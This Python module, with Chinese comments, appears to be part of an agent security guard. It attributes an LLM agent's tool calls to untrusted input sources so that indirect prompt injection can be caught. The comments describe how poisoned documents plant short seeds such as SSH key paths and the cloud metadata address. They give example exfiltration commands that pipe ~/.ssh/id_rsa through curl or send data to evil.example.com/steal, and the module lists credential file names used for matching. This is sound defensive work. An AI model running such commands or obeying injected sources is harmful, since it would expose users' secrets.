"""EvidenceAttributor —— 证据化来源归因(枢衡脊柱),对应赛题目标①④。

不做形式化 taint,而用**可解释证据**判断"这次工具调用是被哪段输入驱动的":
若工具意图的具体参数(路径/URL/命令片段)原文出现在某条来源 SourceSpan 的内容里,
即建立归因边;置信度 = 来源信任权重 × 匹配强度。来源越不可信,归因风险越高。

这条归因边是审计可追溯("哪段输入 → 哪次调用")与策略判定(source_trust /
attribution_confidence)的共同依据。LLM-judge 在 P3 作为后置增强提升弱关联召回。
"""

from __future__ import annotations

import re

from ...core.domain import Attribution, Context, SourceSpan, ToolIntent, TrustLevel
from ...core.registry import capability

# 来源信任级 -> 归因置信度权重(不可信来源的关联最值得警惕)。
_TRUST_WEIGHT: dict[TrustLevel, float] = {
    TrustLevel.UNTRUSTED: 1.0,
    TrustLevel.SEMI_TRUSTED: 0.6,
    TrustLevel.TRUSTED: 0.2,
}
# 参数片段需达到的最小长度,避免 "1"、"a" 之类噪声误关联。
_MIN_TOKEN = 4
# URL scheme 前缀(用于剥离,得到来源原文里更可能出现的"主机+路径"核心)。
_SCHEME = re.compile(r"^[a-z][a-z0-9+.\-]*://")

# --- 结构化种子片段抽取(反向归因:来源里的短种子 → 命中模型扩写出的长参数)---------
# 缺口:间接注入里来源(毒化文档/网页/检索块)常只写一个**短种子**(~/.ssh/id_rsa、
# 169.254.169.254/latest、evil.example.com/steal),模型把它扩写成更长的复合参数
# (command="cat ~/.ssh/id_rsa | curl ..."、url="http://evil.example.com/steal?d=...")。
# 此时"长参数 in 短来源"为假,归因边丢失。对策:从参数值内部反向抽出这些短种子作为候选,
# 使来源里的短种子能命中长参数。匹配逻辑不变(仍是 fragment in excerpt),仅扩候选集。
#
# 防误报护栏(验收重点):只抽**带结构特征**的高判别力 token(路径分隔符 / 域名 / IPv4 /
# 已知敏感令牌名);严禁把参数按空白/通用词切开当片段——否则 arg 里的 report、data 会和
# 无关来源里的同词误关联,凭空制造假归因边。结构化片段即便误纳入也只能整体命中,不会退化成
# 通用词子串匹配。片段仍须 ≥ _MIN_TOKEN。
_IPV4_RX = re.compile(r"\d{1,3}(?:\.\d{1,3}){3}(?:/[\w.\-/]*)?")  # IPv4(可带尾随 /path)
_HOST_RX = re.compile(r"(?:[a-z0-9\-]+\.)+[a-z]{2,}(?:/[\w.\-/]*)?")  # 域名(可带尾随 /path)
_UNIX_PATH_RX = re.compile(r"~?(?:/[\w.\-]+)+|(?:[\w.\-]+/)+[\w.\-]+")  # /etc/passwd、~/.ssh/x
_WIN_PATH_RX = re.compile(r"(?:[a-z]:)?[\w.\-]*(?:\\[\w.\-]+)+")  # C:\Users\x\.ssh
_SEED_RXS = (_IPV4_RX, _HOST_RX, _UNIX_PATH_RX, _WIN_PATH_RX)
_WORD_RX = re.compile(r"[\w.\-]+")
# 不含路径/域名结构、但本身即高敏感信号的令牌名/秘钥文件名(仅作为可识别"整 token"命中)。
# 取带结构特征(`_`/前导 `.`)或唯一密钥文件名者,避免把普通业务词当敏感令牌而误关联。
_SENSITIVE_TOKENS: frozenset[str] = frozenset(
    {
        "id_rsa",
        "id_dsa",
        "id_ecdsa",
        "id_ed25519",
        ".env",
        "credentials",
        "authorized_keys",
        "known_hosts",
        ".htpasswd",
        "aws_secret_access_key",
        "aws_access_key_id",
    }
)


def _seed_fragments(value: str) -> list[str]:
    """从一条参数值内部抽出结构化"种子片段":路径 / 域名+路径 / IPv4 / 敏感令牌名。

    只产出高判别力、带结构特征的 token;域名/IP 若带路径,额外回补**头部**(裸域名/IP),
    因来源种子可能只写到主机一层。回补头部仅限含 `.` 者(域名/IP),避免相对路径首段
    (documents/、tmp/)这类通用词被当片段。通用词(无 `/ \\ . : _` 结构特征)一律不纳入。
    """
    out: list[str] = []

    def _add(frag: str) -> None:
        frag = frag.strip("\"'`").rstrip("/")
        if len(frag) >= _MIN_TOKEN and frag not in out:
            out.append(frag)

    for rx in _SEED_RXS:
        for m in rx.findall(value):
            _add(m)
            if "/" in m:
                head = m.split("/", 1)[0]
                if "." in head:  # 仅回补域名/IP 头部,不回补相对路径首段(通用词)
                    _add(head)
    for tok in _WORD_RX.findall(value):
        if tok in _SENSITIVE_TOKENS and tok not in out:
            out.append(tok)
    return out


def _candidates(value: str) -> list[str]:
    """由一条参数值派生可匹配片段:原值,去壳核心,以及内部结构化种子片段。

    间接注入主战场上,来源(文档/网页)里常只写裸的"主机+路径"(169.254.169.254/x、
    /etc/passwd"),而模型实际调用时会包装成 http://169.254.169.254/x/、给路径加引号、或
    把短种子**扩写进更长的复合命令/URL**。只比整条参数值会让这类调用漏掉归因边,策略随之
    拿不到 source_trust。这里先产出整值与去壳核心(整值候选在前,保持既有优先级),再追加
    内部结构化种子片段(见 _seed_fragments,带护栏防过拟合/误报)。
    """
    raw = value.strip()
    out: list[str] = []
    if len(raw) >= _MIN_TOKEN:
        out.append(raw)
    core = _SCHEME.sub("", raw.strip("\"'`")).rstrip("/")
    if core != raw and len(core) >= _MIN_TOKEN and core not in out:
        out.append(core)
    for frag in _seed_fragments(raw):
        if frag not in out:
            out.append(frag)
    return out


@capability("attributor", "evidence")
class EvidenceAttributor:
    async def attribute(
        self, intent: ToolIntent, spans: list[SourceSpan], ctx: Context
    ) -> Attribution:
        arg_vals = [frag for x in intent.arguments.values() for frag in _candidates(str(x).lower())]
        # 每条命中来源记 (source_id, 置信度, 理由),最后按置信度降序定序 —— 最不可信(置信度
        # 最高)的来源排首位。下游溯源 hit@1 取首位、审计"最可疑驱动源"优先展示都依赖这个序;
        # 此前按 span 输入顺序追加,首位可能是低置信度的可信源,会让 hit@1 系统性偏低。
        hits: list[tuple[str, float, str]] = []
        for span in spans:
            excerpt = span.excerpt.lower()
            matched = next((v for v in arg_vals if v in excerpt), None)
            if matched is None:
                continue
            conf = _TRUST_WEIGHT.get(span.trust_level, 0.5)
            hits.append(
                (
                    span.source_id,
                    conf,
                    f"参数片段 {matched!r} 出现在 {span.source_type}({span.trust_level}) 来源",
                )
            )

        if hits:
            # 置信度降序;同分按原 span 顺序稳定(Python sort 稳定),保持可复现。
            hits.sort(key=lambda h: h[1], reverse=True)
            derived = [h[0] for h in hits]
            best = hits[0][1]
            reasons = [h[2] for h in hits]
        elif intent.derived_from_sources:
            # 调用方(工具网关)显式声明来源但无 span 可核验 → 给中等置信度,fail-closed。
            derived = list(intent.derived_from_sources)
            best = 0.5
            reasons = ["调用方显式声明来源(未提供 span 核验)"]
        else:
            derived, best, reasons = [], 0.0, []

        return Attribution(
            derived_from_sources=derived,
            confidence=round(best, 3),
            rationale="; ".join(reasons) or "未发现来源关联",
        )
